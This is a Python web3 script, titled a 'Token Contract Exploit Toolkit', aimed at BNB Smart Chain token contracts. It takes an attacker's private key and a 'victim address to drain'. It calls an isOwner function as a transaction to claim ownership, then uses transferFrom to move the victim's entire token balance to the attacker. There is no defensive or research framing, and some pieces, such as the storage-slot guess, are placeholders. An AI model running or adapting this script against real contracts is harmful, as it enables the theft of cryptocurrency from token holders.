from web3 import Web3
import argparse
from web3.middleware import geth_poa_middleware

# ===== SETUP ARGUMENTS =====
parser = argparse.ArgumentParser(description="Token Contract Exploit Toolkit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== INIT WEB3 WITH POA SUPPORT =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
print(f"\n[+] Attacker Address: {account.address}")
print(f"[+] Network: {w3.eth.chain_id} ({'Mainnet' if w3.eth.chain_id == 56 else 'Testnet'})")

# ===== COMPLETE TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    
    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }
]

# ===== CORE EXPLOIT FUNCTIONS =====
def verify_ownership(token):
    """Check if we have transfer privileges"""
    print("\n[+] Verifying Ownership Status:")
    
    # Method 1: Check via storage slots (contract-specific)
    try:
        # This is contract-specific - may need adjustment
        owner_slot = w3.keccak(text="is_owner")  # Example slot calculation
        storage = w3.eth.get_storage_at(token.address, owner_slot)
        print(f"Storage at owner slot: {storage.hex()}")
    except Exception as e:
        print(f"Couldn't verify via storage: {e}")

def check_token_state(token, victim):
    """Verify pre-exploit conditions"""
    print("\n[+] Pre-Exploit Token State:")
    
    # Balances
    attacker_bal = token.functions.balanceOf(account.address).call()
    victim_bal = token.functions.balanceOf(victim).call()
    print(f"Attacker Balance: {attacker_bal}")
    print(f"Victim Balance: {victim_bal}")
    
    # Allowance
    allowance = token.functions.allowance(victim, account.address).call()
    print(f"Allowance for Attacker: {allowance}")

def execute_exploit(token, victim):
    """Full exploit sequence"""
    print("\n[+] Executing Exploit...")
    
    # Step 1: Gain ownership
    print("\n[1/3] Claiming Ownership...")
    tx = token.functions.isOwner(account.address).build_transaction({
        "from": account.address,
        "nonce": w3.eth.get_transaction_count(account.address),
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"TX Hash: {tx_hash.hex()}")
    print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")

    # Step 2: Verify state
    print("\n[2/3] Verifying Post-Ownership State...")
    verify_ownership(token)
    check_token_state(token, victim)

    # Step 3: Execute transfer
    print("\n[3/3] Draining Victim...")
    victim_balance = token.functions.balanceOf(victim).call()
    
    tx = token.functions.transferFrom(
        victim,
        account.address,
        victim_balance
    ).build_transaction({
        "from": account.address,
        "nonce": w3.eth.get_transaction_count(account.address),
        "gas": 500_000,
        "gasPrice": w3.eth.gas_price
    })
    
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    
    print("\n[+] Transfer Results:")
    print(f"TX Hash: {tx_hash.hex()}")
    print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
    print(f"Gas Used: {receipt.gasUsed}")
    
    # Verify final state
    new_balance = token.functions.balanceOf(victim).call()
    print(f"\nFinal Victim Balance: {new_balance}")

def main():
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    print("\n[+] Initial Contract State:")
    print(f"Token Address: {token.address}")
    print(f"Symbol: Try token.functions.symbol().call() if available")
    
    check_token_state(token, args.victim_address)
    execute_exploit(token, args.victim_address)
    
    print("\n[+] Exploit Sequence Complete")

if __name__ == "__main__":
    main()
